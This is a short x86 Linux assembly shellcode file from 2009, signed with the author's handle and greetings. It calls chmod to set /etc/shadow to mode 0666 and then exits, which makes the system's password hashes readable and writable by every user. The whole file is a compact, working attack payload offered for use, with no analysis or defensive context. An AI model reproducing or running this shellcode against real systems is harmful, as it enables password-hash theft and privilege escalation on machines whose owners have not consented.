; linux/x86 ; chmod(/etc/shadow, 0666) & exit() 33 bytes
; written by ka0x - <ka0x01[alt+64]gmail.com>
; lun sep 21 17:13:25 CEST 2009
; 
; greets: an0de, Piker, xarnuz, NullWave07, Pepelux, JosS, sch3m4, Trancek and others!

global _start           

section .text

_start: 
  xor eax,eax
  push eax
  push dword 0x776f6461
  push dword 0x68732f2f
  push dword 0x6374652f
  mov ebx,esp
  push word 0x1b6
  pop ecx
  mov al,0xf
  int 0x80
  mov al,0x1
  int 0x80

